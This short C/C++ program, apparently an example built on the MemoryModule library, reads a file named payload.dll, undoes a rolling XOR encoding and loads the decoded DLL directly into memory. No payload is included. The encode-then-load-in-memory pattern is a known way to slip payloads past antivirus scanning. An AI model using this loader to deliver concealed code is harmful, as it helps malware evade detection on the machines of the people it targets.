#define WIN32_LEAN_AND_MEAN
#ifndef _CRT_SECURE_NO_WARNINGS
#define _CRT_SECURE_NO_WARNINGS
#endif

#include <assert.h>
#include <windows.h>
#include <tchar.h>
#include <stdio.h>
#include <malloc.h>

#include "../../MemoryModule.h"

#define DLL_FILE TEXT(".\\payload.dll")


void* ReadLibrary(size_t* pSize) {
    size_t read;
    void* result;
    FILE* fp;

    fp = _tfopen(DLL_FILE, _T("rb"));
    if (fp == NULL)
    {
        _tprintf(_T("Can't open DLL file \"%s\"."), DLL_FILE);
        return NULL;
    }

    fseek(fp, 0, SEEK_END);
    *pSize = static_cast<size_t>(ftell(fp));
    if (*pSize == 0)
    {
        fclose(fp);
        return NULL;
    }

    result = (unsigned char *)malloc(*pSize);
    if (result == NULL)
    {
        return NULL;
    }

    fseek(fp, 0, SEEK_SET);
    read = fread(result, 1, *pSize, fp);
    fclose(fp);
    if (read != *pSize)
    {
        free(result);
        return NULL;
    }

    return result;
}


void LoadFromMemory(void)
{
    void *data;
    size_t size;
    HMEMORYMODULE handle;

    data = ReadLibrary(&size);
    if (data == NULL)
    {
        return;
    }
    
    //
    // XOR decoder
    //
    unsigned char k = ((unsigned char * ) data)[0];
    unsigned char pk;
    for (size_t i = 1; i < size; i++) {
        pk = ((unsigned char * ) data)[i];
        ((unsigned char * ) data)[i] ^= k;
        k = pk;
    }

    handle = MemoryLoadLibrary(data, size);
    if (handle == NULL)
    {
        _tprintf(_T("Can't load library from memory.\n"));
        goto exit;
    }
    
    MemoryFreeLibrary(handle);

exit:
    free(data);
}


int main()
{
    LoadFromMemory();
    return 0;
}
